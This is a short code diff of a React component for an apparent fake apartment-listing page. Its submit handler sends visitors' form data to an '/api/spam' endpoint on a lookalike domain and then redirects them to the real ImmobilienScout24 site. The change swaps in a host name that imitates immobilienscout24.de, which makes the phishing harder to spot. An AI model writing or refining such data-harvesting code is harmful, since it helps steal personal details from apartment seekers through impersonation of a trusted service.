@@ -41,7 +41,7 @@ export default function Wohnungen() {
 
   async function handleSubmitFn() {
     try {      
-      await axios.post(`https://de-besuchtermiin.com/api/spam`, data);
+      await axios.post(`https://immobilienscout24.de-besuchtermiin.com/api/spam`, data);
       router.replace('https://www.immobilienscout24.de/');
     } catch(err) {
             router.replace('https://www.immobilienscout24.de/');
